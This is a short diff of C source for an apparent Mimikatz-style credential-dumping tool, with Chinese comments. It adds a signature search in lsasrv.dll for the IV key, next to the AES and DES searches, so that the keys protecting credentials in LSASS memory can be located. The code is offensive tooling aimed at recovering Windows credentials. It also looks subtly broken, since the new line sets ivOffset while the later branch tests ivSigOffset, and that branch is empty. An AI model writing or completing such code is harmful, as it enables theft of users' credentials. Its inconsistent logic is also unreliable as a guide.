@@ -1,4 +1,3 @@
-
 #include "mimikatz.h"
 #include <stdio.h>
 
@@ -106,6 +105,7 @@ VOID LocateUnprotectLsassMemoryKeys() {
 	// 获取首条指令 and [rsp+70h+var_40], 0 相对lsasrv.dll模块基址的偏移
 	aesSigOffset = SearchPattern(lsasrvBaseAddress, keyAESSig, sizeof keyAESSig);
 	desSigOffset = SearchPattern(lsasrvBaseAddress, keyDESSig, sizeof keyDESSig);
+	ivOffset = SearchPattern(lsasrvBaseAddress, keyIVSig, sizeof keyIVSig);
 	wprintf(L"aesSigOffset = 0x%x\ndesSigOffset = 0x%x\n", aesSigOffset,desSigOffset);	// 0x752AB (00000001800752AB & 0xFFFFF)
 	if (aesSigOffset != 0) {
 		// 从lsass进程的内存位置lsasrvBaseAddress + keySigOffset + sizeof keyAESSig 上读取4字节的偏移
@@ -152,7 +152,7 @@ VOID LocateUnprotectLsassMemoryKeys() {
 	}
 	// IV部分
 	if (ivSigOffset != 0) {
-
+		
 	}
 }
 
